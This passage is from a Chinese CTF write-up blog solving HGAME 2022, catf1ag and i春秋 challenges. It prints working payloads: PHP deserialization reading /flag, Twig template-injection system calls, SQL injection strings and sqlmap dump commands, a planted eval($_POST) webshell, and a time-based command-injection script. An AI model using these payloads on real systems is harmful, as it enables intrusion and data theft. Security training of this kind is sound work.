class=\"line\"><span class=\"comment\">#有5000个A</span></span><br></pre></td></tr></table></figure>\n\n<p>hgame{COng@tul4ti0n~u_r3prOduced_CVE-2021-40438}</p>\n<h6 id=\"一本单词书\"><a href=\"#一本单词书\" class=\"headerlink\" title=\"一本单词书\"></a>一本单词书</h6><p>1.网址加<a href=\"http://www.zip下载源代码,根据login.php可知账号adm1n,密码1080‘/\">www.zip下载源代码，根据login.php可知账号adm1n，密码1080‘</a> 可以绕过。</p>\n<p>2.查看index.php可知点击后会把key，value给save.php。</p>\n<p>3.由save中的encode函数可知，会将key与val用|隔开，并将val序列化存储。saveSessionData主要是获取数据同时调用encode函数将数据存储到指定位置，该文件是由登陆时产生的key进行命名的。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">encode</span>(<span class=\"params\"><span class=\"variable\">$data</span></span>): <span class=\"title\">string</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"variable\">$result</span> = <span class=\"string\">&#x27;&#x27;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">foreach</span> (<span class=\"variable\">$data</span> <span class=\"keyword\">as</span> <span class=\"variable\">$k</span> =&gt; <span class=\"variable\">$v</span>) &#123;</span><br><span class=\"line\">        <span class=\"variable\">$result</span> .= <span class=\"variable\">$k</span> . <span class=\"string\">&#x27;|&#x27;</span> . serialize(<span class=\"variable\">$v</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"variable\">$result</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">\t<span class=\"variable\">$data</span> = <span class=\"string\">&#x27;&#123;&quot;1&quot;:&quot;2&quot;&#125;&#x27;</span>;</span><br><span class=\"line\">\t<span class=\"variable\">$b</span>=encode(json_decode(<span class=\"variable\">$data</span>));</span><br><span class=\"line\">\t<span class=\"keyword\">echo</span> <span class=\"variable\">$b</span>;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>4.首先文件告诉了我们flag位置，其次分析两个function，decode函数主要是对传入的数据进行反序列化输出，与刚才save.php中的encode函数互相对应，可以看到encode函数是通过“|”分割key和value的，而decode函数则是通过“|”来进行数据判断，对“|”后来的数据进行反序列化操作。这里就存在一个问题，我们可以通过传输数据中添加“|”以此来利用docode函数的反序列化进行执行，同时查看evil.php发现了获取flag的点。<strong>存在file_get_contents，至此我们可以利用evil.php生成payload，再通过get.php进行触发，构造payload，尝试读取文件</strong></p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Evil</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$file</span>=<span class=\"string\">&quot;/etc/passwd&quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$flag</span>=<span class=\"string\">&quot;flag&#123;&#125;&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$data</span>=<span class=\"keyword\">new</span> Evil();</span><br><span class=\"line\"><span class=\"keyword\">echo</span> serialize(<span class=\"variable\">$data</span>);</span><br><span class=\"line\"><span class=\"comment\">//O:4:&quot;Evil&quot;:2:&#123;s:4:&quot;file&quot;;s:11:&quot;/etc/passwd&quot;;s:4:&quot;flag&quot;;s:6:&quot;flag&#123;&#125;&quot;;&#125;</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;<span class=\"string\">&quot;1|O:4:\\&quot;Evil\\&quot;:2:&#123;s:4:\\&quot;file\\&quot;;s:11:\\&quot;/etc/passwd\\&quot;;s:4:\\&quot;flag\\&quot;;s:6:\\&quot;flag&#123;&#125;\\&quot;;&#125;&quot;</span>:<span class=\"string\">&quot;123&quot;</span>&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#最终构造的payload</span></span><br><span class=\"line\">&#123;<span class=\"string\">&quot;1|O:4:\\&quot;Evil\\&quot;:2:&#123;s:4:\\&quot;file\\&quot;;s:5:\\&quot;/flag\\&quot;;s:4:\\&quot;flag\\&quot;;s:6:\\&quot;flag&#123;&#125;\\&quot;;&#125;&quot;</span>:<span class=\"string\">&quot;123&quot;</span>&#125;</span><br></pre></td></tr></table></figure>\n\n<p>hgame{Uns@f3_D3seR1@liz4t1On!Is~h0rr1b1e-!n_PhP}</p>\n<p>注意：需要理解各个网页的作用，save.php是提交值的，get.php是执行反序列化的，evil.php是生成payload的，必须通过一个php文件来生成，login.php只是一个图形界面。</p>\n<h5 id=\"Level-Week3\"><a href=\"#Level-Week3\" class=\"headerlink\" title=\"Level - Week3\"></a>Level - Week3</h5><h5 id=\"web\"><a href=\"#web\" class=\"headerlink\" title=\"web\"></a>web</h5><h6 id=\"SecurityCenter\"><a href=\"#SecurityCenter\" class=\"headerlink\" title=\"SecurityCenter\"></a>SecurityCenter</h6><p>由跳转指令，说明其存在twig的模板注入，修改/redirect.php?url=<a href=\"https://www.baidu.com来进行注入./\">https://www.baidu.com来进行注入。</a></p>\n<p>使用/redirect.php?url=2*{[“id”]|map(“system”)}*2</p>\n<p>使用/redirect.php?url=2*{[“ls /“]|map(“system”)}*2</p>\n<p>cat被过滤，使用tac发现替换了含有hgame的字符串，由此尝试逆序输出：</p>\n<p>/redirect.php?url=2*{[“rev /flag”]|map(“system”)}*2</p>\n<p>可以得到最终的flag</p>\n<p>hgame{!Tw19-S5t1<del>1s^s00O0O_inter3st1n5</del>!}</p>\n<p>‘)or 1=1–+ </p>\n<p>admin’) (‘union select 1 from infoorrmation_schema.tables</p>\n<h6 id=\"LoginMe\"><a href=\"#LoginMe\" class=\"headerlink\" title=\"LoginMe\"></a>LoginMe</h6><p>1.查看源代码，找到hint，发现应该是sql注入。</p>\n<p>2.使用sqlmap，bs抓包并保存为1.txt。</p>\n<p>2.一种是sqlmap -r 1.txt –data –union-char –sql-shell</p>\n<p>另一种是sqlmap -r 1.txt –batch –current-db #发现SQLite_masterdb数据库名</p>\n<p>sqlmap -r 1.txt –batch –batch -D “SQLite_masterdb” –tables #发现uuussseeeerrrsss表名</p>\n<p>sqlmap -r 1.txt –batch –batch -D “SQLite_masterdb”  -T “uuussseeeerrrsss” –columns #发现username和password</p>\n<p>sqlmap -r 1.txt –batch –batch -D “SQLite_masterdb”  -T “uuussseeeerrrsss” “ -C “username,password” –dump  #可以查看admin密码</p>\n<p>输入密码，可以得到flag。</p>\n<p>hgame{a200243b5955862cf505db988688b543790e2328054962184b63f3944917f08f}</p>\n<p>使用sqlmap自动化注入。</p>\n<h6 id=\"reverse\"><a href=\"#reverse\" class=\"headerlink\" title=\"reverse\"></a>reverse</h6><h6 id=\"Answer’s-Windows\"><a href=\"#Answer’s-Windows\" class=\"headerlink\" title=\"Answer’s Windows\"></a>Answer’s Windows</h6><p>1.用 QT 写的图形界面，通过文件中的关键字符串定位到判断flag的地方：</p>\n<p>2.sub_140001F90 就是加密函数 对加密函数进行分析，为 base64 加密。</p>\n<p>background-image: url(:/new/prefix1/C:/Users/Answer/Desktop/right.png);为判断flag正确与否的字符串。因为它是一个正确会放出图片的显示。</p>\n<p>官方wp的base64特征：</p>\n<p><img src=\"/2022/02/20/HGAME2022%E5%A4%8D%E7%8E%B0/image-20220211212523340.png\" alt=\"image-20220211212523340\"></p>\n<p>3.其中对 base64table 查看引用即可得到更改base64table的地方：IsDebuggerPresent这里有个简单的反调试，静态分析无所谓的。可以得到：</p>\n<p>密文：;’&gt;B&lt;76=82@-8.@=T”@-7ZU:8*F=X2J<G>@=W^@-8.@9D2T:49U@1aa</G></p>\n<p>自定义：!”#$%&amp;’()*+,-./0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[]^_`a 可以从字符串中找到</p>\n<p>解的</p>\n<p>hgame{qt_1s_s0_1nteresting_so_1s_b4se64}</p>\n<p>注意因为memcmp的字符串里面会有转义字符，如果使用cyberchef之类的工 具的话是当普通字符识别的，所以将密文分辨\\再转义回来。</p>\n<p>这个软件太大，不容易分析。并且里面不知有base64，最重要的还是找到判断flag是否正确的字符串。</p>\n<h6 id=\"creakme3\"><a href=\"#creakme3\" class=\"headerlink\" title=\"creakme3\"></a>creakme3</h6><ol>\n<li><p>要反编译PowerPC 汇编，一般版本的ida无法一键f5，而ida7.5可以，所以可以下一个ida7.5。</p>\n</li>\n<li><p>用ida7.5反编译main函数，可知道算法：会随机生成数组到v7，再判断第二个数是否是按v7内的内容顺序排序，是则输出flag，第一个数是ascii，根据算法可得代码。这个算法又叫猴子排序。</p>\n<p>ida的main函数：</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">memset</span>(v7, <span class=\"number\">0</span>, <span class=\"number\">0x164</span>u);</span><br><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Welcome my whitegive re task! This is your flag: &quot;</span>);</span><br><span class=\"line\"><span class=\"keyword\">do</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; i &lt;= <span class=\"number\">88</span>; ++i )</span><br><span class=\"line\">    *&amp;v7[<span class=\"number\">4</span> * i] = <span class=\"built_in\">rand</span>() % <span class=\"number\">89</span>;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> ( j = <span class=\"number\">1</span>; j &lt;= <span class=\"number\">88</span> &amp;&amp; a[<span class=\"number\">2</span> * *&amp;v7[<span class=\"number\">4</span> * j] + <span class=\"number\">1</span>] &gt;= a[<span class=\"number\">2</span> * *&amp;v7[<span class=\"number\">4</span> * j - <span class=\"number\">4</span>] + <span class=\"number\">1</span>]; ++j )</span><br><span class=\"line\">    ;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">while</span> ( j != <span class=\"number\">89</span> );</span><br><span class=\"line\"><span class=\"keyword\">for</span> ( k = <span class=\"number\">0</span>; k &lt;= <span class=\"number\">88</span>; ++k )</span><br><span class=\"line\">  <span class=\"built_in\">putchar</span>(a[<span class=\"number\">2</span> * *&amp;v7[<span class=\"number\">4</span> * k]]);</span><br></pre></td></tr></table></figure></li>\n<li><pre><code class=\"python\">#用第二个数做冒泡排序，并按顺序输出flag\nkey=[48,20093,48,26557,48,31304,48,33442,48,37694,49,39960,50,23295,50,27863,50,42698,50,48505,50,52925, 51,12874,51,12946,51,14597,51,17041,51,23262,51,28319,51,42282,51,48693,51,52067,53,32571,56,14612,56,45741,57,14554,57,20048,57,27138,57,45327,66,30949,95,32502,95,35235,95,36541,95,38371,97,29658,100,21388,100,25403,100,40604,100,46987,100,51302,101,12974,101,30329,102,10983,102,19818,102,22280,102,26128,102,41560,102,47116,102,51333,103,28938,103,31988,104,16246,104,28715,104,41966,104,44368,104,47815,105,16420,105,35362,105,49237,106,11090,106,50823,107,24320,107,50199,108,24962,109,30171,110,15457,110,18838,110,24001,111,11638,111,32023,111,43291,112,39661,114,17872,114,33895,114,43869,115,20611,115,25122,115,36243,115,37434,115,38686,115,46266,115,51077,116,13656,116,34493,116,38712,117,14096,117,38777,119,12095,119,17629,123,30945,125,40770]\n\ndef bubbleSort(arr):  #冒泡排序\n  n = len(arr)\n  # 遍历所有数组元素\n  for i in range(n):\n    # Last i elements are already in place\n    for j in range(0, n - i - 1):\n      if arr[j] &gt; arr[j + 1]:\n        arr[j], arr[j + 1] = arr[j + 1], arr[j]\nkey1=[20093, 26557, 31304, 33442, 37694, 39960, 23295, 27863, 42698, 48505, 52925, 12874, 12946, 14597, 17041, 23262, 28319, 42282, 48693, 52067, 32571, 14612, 45741, 14554, 20048, 27138, 45327, 30949, 32502, 35235, 36541, 38371, 29658, 21388, 25403, 40604, 46987, 51302, 12974, 30329, 10983, 19818, 22280, 26128, 41560, 47116, 51333, 28938, 31988, 16246, 28715, 41966, 44368, 47815, 16420, 35362, 49237, 11090, 50823, 24320, 50199, 24962, 30171, 15457, 18838, 24001, 11638, 32023, 43291, 39661, 17872, 33895, 43869, 20611, 25122, 36243, 37434, 38686, 46266, 51077, 13656, 34493, 38712, 14096, 38777, 12095, 17629, 30945, 40770]\nsort=[10983, 11090, 11638, 12095, 12874, 12946, 12974, 13656, 14096, 14554, 14597, 14612, 15457, 16246, 16420, 17041, 17629, 17872, 18838, 19818, 20048, 20093, 20611, 21388, 22280, 23262, 23295, 24001, 24320, 24962, 25122, 25403, 26128, 26557, 27138, 27863, 28319, 28715, 28938, 29658, 30171, 30329, 30945, 30949, 31304, 31988, 32023, 32502, 32571, 33442, 33895, 34493, 35235, 35362, 36243, 36541, 37434, 37694, 38371, 38686, 38712, 38777, 39661, 39960, 40604, 40770, 41560, 41966, 42282, 42698, 43291, 43869, 44368, 45327, 45741, 46266, 46987, 47116, 47815, 48505, 48693, 49237, 50199, 50823, 51077, 51302, 51333, 52067, 52925]\nflag=&quot;&quot;\n\nfor j in range(len(sort)):\n  for i in range(len(key)):\n    if(key[i]==sort[j]):\n      flag+=chr(key[i-1])\nprint(flag)\n&quot;&quot;&quot;bubbleSort(key1)\nprint(key1)&quot;&quot;&quot;\n&quot;&quot;&quot;mm=[]\nfor i in range(1,len(key),2):\n    mm.append(key[i])\nprint(mm)&quot;&quot;&quot;\n#fjow33etu938nhi3wrnf90sdf32nklsdf0923hgame&#123;B0go_50rt_is_s0_stup1d&#125;fh32orh98sdfh23ikjsdf32\n</code></pre>\n</li>\n</ol>\n<p>可得hgame{B0go_50rt_is_s0_stup1d}</p>\n<h4 id=\"Week4\"><a href=\"#Week4\" class=\"headerlink\" title=\"Week4\"></a>Week4</h4><h5 id=\"Re-1\"><a href=\"#Re-1\" class=\"headerlink\" title=\"Re\"></a>Re</h5><h6 id=\"WOW\"><a href=\"#WOW\" class=\"headerlink\" title=\"( WOW )\"></a>( WOW )</h6><p><img src=\"/2022/02/20/HGAME2022%E5%A4%8D%E7%8E%B0/image-20220220113824461.png\" alt=\"image-20220220113824461\"></p>\n<p>在上面两个循环内一个是加密一个是解密，只需要把密文改为Buf1，通过memcmp函数，再让Buf2通过解密函数可以直接在内存中得到</p>\n<p>hgame{WOWOW_h@ppy_n3w_ye4r_2022}</p>\n","categories":["ctf比赛"],"tags":["Hgame2022复现"]},{"title":"catf1ag两小时AK赛","url":"/2022/05/10/catf1ag%E4%B8%A4%E5%B0%8F%E6%97%B6AK%E8%B5%9B/","content":"<p>比较简单的题目</p>\n<span id=\"more\"></span>\n\n<h4 id=\"两小时AK赛-MISC-签签\"><a href=\"#两小时AK赛-MISC-签签\" class=\"headerlink\" title=\"[两小时AK赛] - MISC - 签签\"></a>[两小时AK赛] - MISC - 签签</h4><p>图片尾部base64</p>\n<p>ZjFhZyU3QmNjMDIwNjFlLWM4OGQtMTFlYy1iZWRiLTJjZjA1ZDk1NTQ1NSU3RA==</p>\n<p>f1ag%7Bcc02061e-c88d-11ec-bedb-2cf05d955455%7D</p>\n<h4 id=\"两小时AK赛-CRYPTO-怎么会多一个呢\"><a href=\"#两小时AK赛-CRYPTO-怎么会多一个呢\" class=\"headerlink\" title=\"[两小时AK赛] - CRYPTO - 怎么会多一个呢\"></a>[两小时AK赛] - CRYPTO - 怎么会多一个呢</h4><p><img src=\"/2022/05/10/catf1ag%E4%B8%A4%E5%B0%8F%E6%97%B6AK%E8%B5%9B/image-20220508224113515.png\" alt=\"image-20220508224113515\"></p>\n<p><img src=\"/2022/05/10/catf1ag%E4%B8%A4%E5%B0%8F%E6%97%B6AK%E8%B5%9B/image-20220508222244682.png\" alt=\"image-20220508222244682\"></p>\n<h4 id=\"两小时AK赛-CRYPTO-高实在是高\"><a href=\"#两小时AK赛-CRYPTO-高实在是高\" class=\"headerlink\" title=\"[两小时AK赛] - CRYPTO - 高实在是高\"></a>[两小时AK赛] - CRYPTO - 高实在是高</h4><p>小e攻击，多出来的当做p或q</p>\n<h4 id=\"两小时AK赛-WEB-签到了-你会玩2048么\"><a href=\"#两小时AK赛-WEB-签到了-你会玩2048么\" class=\"headerlink\" title=\"[两小时AK赛] - WEB - 签到了!!!你会玩2048么?\"></a>[两小时AK赛] - WEB - 签到了!!!你会玩2048么?</h4><p>flag查找工具直接扫，即可获得flag。</p>\n<h4 id=\"两小时AK赛-WEB-easy-unser\"><a href=\"#两小时AK赛-WEB-easy-unser\" class=\"headerlink\" title=\"[两小时AK赛] - WEB - easy_unser\"></a>[两小时AK赛] - WEB - easy_unser</h4><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">/?catf1ag=O:<span class=\"number\">7</span>:<span class=\"string\">&quot;catf1ag&quot;</span>:<span class=\"number\">2</span>:&#123;s:<span class=\"number\">6</span>:<span class=\"string\">&quot;target&quot;</span>;s:<span class=\"number\">27</span>:<span class=\"string\">&quot;&lt;?php eval(<span class=\"subst\">$_POST</span>[&quot;</span>hp<span class=\"string\">&quot;]);?&gt;&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>\n\n<p>用蚁剑连接，密码hp，即可获得flag</p>\n<h5 id=\"已下题目是复现的\"><a href=\"#已下题目是复现的\" class=\"headerlink\" title=\"已下题目是复现的\"></a>已下题目是复现的</h5><h4 id=\"两小时AK赛-MISC-奇怪的字符\"><a href=\"#两小时AK赛-MISC-奇怪的字符\" class=\"headerlink\" title=\"[两小时AK赛] - MISC - 奇怪的字符\"></a>[两小时AK赛] - MISC - 奇怪的字符</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">bcwb4g`s lyLMb?ftR~qh</span><br></pre></td></tr></table></figure>\n\n<p>异或变异</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"></span><br><span class=\"line\">data = <span class=\"built_in\">open</span>(<span class=\"string\">&#x27;secret.txt&#x27;</span>,<span class=\"string\">&#x27;r&#x27;</span>).read()</span><br><span class=\"line\"><span class=\"built_in\">print</span>(data)</span><br><span class=\"line\">a = <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> data:</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"built_in\">chr</span>(<span class=\"built_in\">ord</span>(i)^a),end=<span class=\"string\">&#x27;&#x27;</span>)</span><br><span class=\"line\">    a+=<span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"comment\">#catf1ag&#123;vfr@@l0ve@me&#125;</span></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"两小时AK赛-CRYPTO-栓q\"><a href=\"#两小时AK赛-CRYPTO-栓q\" class=\"headerlink\" title=\"[两小时AK赛] - CRYPTO - 栓q\"></a>[两小时AK赛] - CRYPTO - 栓q</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">这是什么东西，我怎么没见AT+CMGS=86</span><br><span class=\"line\">0001000D91683106019196F4000848771F7684662F681300517ED94F600066006C00610067FF1A0063006100740066003100610067007B00660034006500660037006400640036002D0063006400610031002D00310031</span><br></pre></td></tr></table></figure>\n\n<p><a href=\"http://www.sendsms.cn/pdu/\">PDU编码解码工具 (sendsms.cn)</a></p>\n<p>解密前半部分<strong>金笛短信PDU编码解码工具</strong>：真的是栓Q给你flag：catf1ag{f4ef7dd6-cda1-11<br>Length:36</p>\n<p>解密后半部分零宽度字符的Unicode隐写术</p>\n<p>这是纯文本隐写术，带有Unicode的零宽度字符。<br>零宽度字符插入文本中。</p>\n<p>ec-860b-2cf05d955455}</p>\n<h4 id=\"两小时AK赛-MISC-这4什么好看的\"><a href=\"#两小时AK赛-MISC-这4什么好看的\" class=\"headerlink\" title=\"[两小时AK赛] - MISC - 这4什么好看的\"></a>[两小时AK赛] - MISC - 这4什么好看的</h4><p>steghide 爆破密码（看见题目4可以尝试纯数字爆破）</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>,<span class=\"number\">9999</span>):</span><br><span class=\"line\">    os.system(<span class=\"string\">f&#x27;steghide extract -sf test2.jpeg -p <span class=\"subst\">&#123;i&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"两小时AK赛-WEB-你猜猜是什么注入\"><a href=\"#两小时AK赛-WEB-你猜猜是什么注入\" class=\"headerlink\" title=\"[两小时AK赛] - WEB - 你猜猜是什么注入?\"></a>[两小时AK赛] - WEB - 你猜猜是什么注入?</h4><p>1.考察命令注入，但是这个命令注入和往时的不一样，主要是做了时间注入的成分在里面，题目本身过滤了很多函数和命令，如果匹配到过滤的字符，就会提示有waf，经过遍历发现，没有过滤cat，其实，既然是带有时间注入的命令注入，那我们就能用Linux命令sleep配合cat /flag，然后再转成数字，这里也可以手测，但是20多个字符得测到什么时候，所以用脚本跑更快，payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">/?catf1ag=sleep `cat /flag | cut -c a | tr &#123;1&#125; 2`</span><br></pre></td></tr></table></figure>\n\n<p>通过替换cut -c {字符}和tr {数字}，让正确的字符转成数字，然后配合sleep就可以达到时间注入的效果，通过观察返回的时间就能判断出正确的字符，抛出来后，注意要对照给出的flag格式catf1ag{xxxxx-xxxxx-xxxxx-xxxxx-xxxxx}</p>\n<p>代码来源于网上：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"><span class=\"comment\"># s = &quot;&quot;</span></span><br><span class=\"line\"><span class=\"comment\"># for i in range(32,128):</span></span><br><span class=\"line\"><span class=\"comment\">#     s += chr(i)</span></span><br><span class=\"line\">s = <span class=\"string\">&quot;0123456789abcdefghijklmnopqrstuvwxyz-&#123;&#125;&quot;</span></span><br><span class=\"line\">flag = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,<span class=\"number\">50</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> s:</span><br><span class=\"line\">        url = <span class=\"string\">&quot;http://ce83b8ee-ef27-4c87-8bf3-e2bf99132f26.subject.catf1ag.cn:9999/?catf1ag=&quot;</span> + <span class=\"string\">f&quot;sleep `cat /flag | cut -c <span class=\"subst\">&#123;i&#125;</span> | tr <span class=\"subst\">&#123;j&#125;</span> 2`&quot;</span></span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(url)</span><br><span class=\"line\">            requests.adapters.DEFAULT_RETRIES = <span class=\"number\">5</span> <span class=\"comment\"># 增加重连次数</span></span><br><span class=\"line\">            requests.get(url,timeout=<span class=\"number\">2</span>)</span><br><span class=\"line\">        <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"built_in\">str</span>(e))</span><br><span class=\"line\">            flag += j</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(flag)</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        time.sleep(<span class=\"number\">2</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(flag)</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">catf1ag&#123;canvt-cjtiof-dzswa-ggrbpy&#125;</span><br></pre></td></tr></table></figure>\n\n<p>2.经测试<code>cat，/，|，tee</code>可以用，虽然页面不能回显，但是我们可以把结果保存到文件中。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">?catf1ag=cat /flag | tee <span class=\"number\">1.</span>txt</span><br><span class=\"line\"><span class=\"comment\">#把flag内容保存到1.txt中</span></span><br></pre></td></tr></table></figure>\n\n<p>再访问1.txt</p>\n","categories":["ctf比赛"],"tags":["比较简单的比赛"]},{"title":"i春秋5月题目复现","url":"/2022/05/10/i%E6%98%A5%E7%A7%8B5%E6%9C%88%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/","content":"<h5 id=\"i春秋5月题目复现\"><a href=\"#i春秋5月题目复现\" class=\"headerlink\" title=\"i春秋5月题目复现\"></a>i春秋5月题目复现</h5><span id=\"more\"></span>\n\n<h4 id=\"Mercy-code\"><a href=\"#Mercy-code\" class=\"headerlink\" title=\"Mercy-code\"></a><strong>Mercy-code</strong></h4><h5 id=\"cmd-passthru-“ls”-可以读取文件\"><a href=\"#cmd-passthru-“ls”-可以读取文件\" class=\"headerlink\" title=\"cmd=passthru(“ls”);   可以读取文件\"></a>cmd=passthru(“ls”);   可以读取文件</h5><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">highlight_file(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;cmd&#x27;</span>]) &#123;</span><br><span class=\"line\">    <span class=\"variable\">$cmd</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;cmd&#x27;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"string\">&#x27;;&#x27;</span> === preg_replace(<span class=\"string\">&#x27;/[a-z_]+\\((?R)?\\)/&#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>, <span class=\"variable\">$cmd</span>)) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (preg_match(<span class=\"string\">&#x27;/file|if|localeconv|phpversion|sqrt|et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log|var_dump|pos|current|array|time|se|ord/i&#x27;</span>, <span class=\"variable\">$cmd</span>)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;What are you thinking?&#x27;</span>);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">eval</span>(<span class=\"variable\">$cmd</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;Please calm down&#x27;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>第一种：</p>\n<p>payload:echo(implode(scandir(chr(strrev(uniqid())))));          </p>\n<p>Bp跑一下看看flag在哪，发现在当前目录下的一个php文件里</p>\n<p>然后show_source(end(scandir(chr(strrev(uniqid())))));</p>\n<p>再跑一下，在返回 length 最小的包里找到了 flag</p>\n<h5 id=\"uniqid-函数基于以微秒计的当前时间，生成一个唯一的-ID。\"><a href=\"#uniqid-函数基于以微秒计的当前时间，生成一个唯一的-ID。\" class=\"headerlink\" title=\"uniqid() 函数基于以微秒计的当前时间，生成一个唯一的 ID。\"></a>uniqid() 函数基于以微秒计的当前时间，生成一个唯一的 ID。</h5><h5 id=\"strrev-字符串反转，strrev-uniqid-可以生成随机字符。其希望爆出”-”\"><a href=\"#strrev-字符串反转，strrev-uniqid-可以生成随机字符。其希望爆出”-”\" class=\"headerlink\" title=\"strrev()字符串反转，strrev(uniqid())可以生成随机字符。其希望爆出”.”\"></a>strrev()字符串反转，strrev(uniqid())可以生成随机字符。其希望爆出”.”</h5><h5 id=\"scandir-列出目录中的文件和目录\"><a href=\"#scandir-列出目录中的文件和目录\" class=\"headerlink\" title=\"scandir() 列出目录中的文件和目录\"></a>scandir() 列出目录中的文件和目录</h5><h5 id=\"implode-把数组元素组合为字符串\"><a href=\"#implode-把数组元素组合为字符串\" class=\"headerlink\" title=\"implode()把数组元素组合为字符串\"></a>implode()把数组元素组合为字符串</h5><h5 id=\"end-取最后一个数组内容\"><a href=\"#end-取最后一个数组内容\" class=\"headerlink\" title=\"end()取最后一个数组内容\"></a>end()取最后一个数组内容</h5><h5 id=\"scandir-show-source直接读文件的\"><a href=\"#scandir-show-source直接读文件的\" class=\"headerlink\" title=\"scandir+show_source直接读文件的\"></a>scandir+show_source直接读文件的</h5><h5 id=\"show-source-函数对文件进行语法高亮显示。\"><a href=\"#show-source-函数对文件进行语法高亮显示。\" class=\"headerlink\" title=\"show_source() 函数对文件进行语法高亮显示。\"></a>show_source() 函数对文件进行语法高亮显示。</h5><p>第二种：</p>\n<h5 id=\"首先echo，发现前后都附加了header，构造命令并执行\"><a href=\"#首先echo，发现前后都附加了header，构造命令并执行\" class=\"headerlink\" title=\"首先echo，发现前后都附加了header，构造命令并执行\"></a>首先echo，发现前后都附加了header，构造命令并执行</h5><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">cmd=<span 